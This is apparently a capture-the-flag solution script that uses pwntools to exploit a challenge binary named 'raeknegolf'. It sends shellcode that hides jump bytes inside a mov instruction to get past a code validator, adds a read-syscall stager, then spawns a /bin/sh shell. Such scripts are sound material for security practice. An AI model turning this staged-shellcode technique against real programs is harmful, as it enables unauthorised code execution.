#!/usr/bin/python3

from pwn import *

p = process('./raeknegolf')
#p = remote('127.0.0.1', 3000)

#gdb.attach(p, """
#    b validate_program
#    b run_program
#    c
#""")

p.recvuntil(b'Skriv')

# Code input
shellcode = """
mov rax,0xffffffffe9eb00ff
"""
shell = asm(shellcode, arch="amd64")
p.sendafter(b'Kod: ', shell)

# Name input
shellcode = """
mov rsi, rdi
mov edx, 50
xor rdi, rdi
xor rax, rax
syscall
"""
shell = asm(shellcode, arch="amd64").ljust(16, b'\x90')
p.sendafter(b': ', shell)

# Stager input
shell = asm(shellcraft.amd64.linux.sh(), arch="amd64")
p.sendline(shell)

p.interactive()
